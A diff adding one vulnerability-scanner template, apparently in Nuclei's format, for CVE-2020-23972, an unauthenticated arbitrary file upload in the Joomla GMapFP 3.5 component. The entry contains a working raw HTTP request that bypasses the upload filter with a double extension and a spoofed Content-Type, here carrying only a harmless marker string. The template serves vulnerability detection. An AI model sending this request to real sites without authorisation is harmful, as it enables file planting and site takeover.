@@ -3561,6 +3561,37 @@
       ]
     },
     {
+      "id": "cve-2020-23972",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "An attacker can access the upload function of the application\nwithout authenticating to the application and also can upload\nfiles due the issues of unrestricted file upload which can be\nbypassed by changing Content-Type & name file too double ext.\n",
+        "name": "Joomla! Component GMapFP 3.5 - Unauthenticated Arbitrary File Upload",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "extractors": [
+            {
+              "part": "body",
+              "regex": [
+                "window\\.opener\\.(changeDisplayImage|addphoto)\\(\"(.*?)\"\\);"
+              ],
+              "type": "regex"
+            }
+          ],
+          "payloads": {
+            "component": [
+              "com_gmapfp",
+              "comgmapfp"
+            ]
+          },
+          "raw": [
+            "POST /index.php?option=§component§&controller=editlieux&tmpl=component&task=upload_image HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarySHHbUsfCoxlX1bpS\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: {{BaseURL}}\nConnection: close\n\n------WebKitFormBoundarySHHbUsfCoxlX1bpS\nContent-Disposition: form-data; name=\"option\"\n\ncom_gmapfp\n------WebKitFormBoundarySHHbUsfCoxlX1bpS\nContent-Disposition: form-data; name=\"image1\"; filename=\"nuclei.html.gif\"\nContent-Type: text/html\n\nprojectdiscovery\n\n------WebKitFormBoundarySHHbUsfCoxlX1bpS\nContent-Disposition: form-data; name=\"no_html\"\n\nno_html\n------WebKitFormBoundarySHHbUsfCoxlX1bpS--\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "cve-2020-24223",
       "info": {
         "author": "pikpikcu",
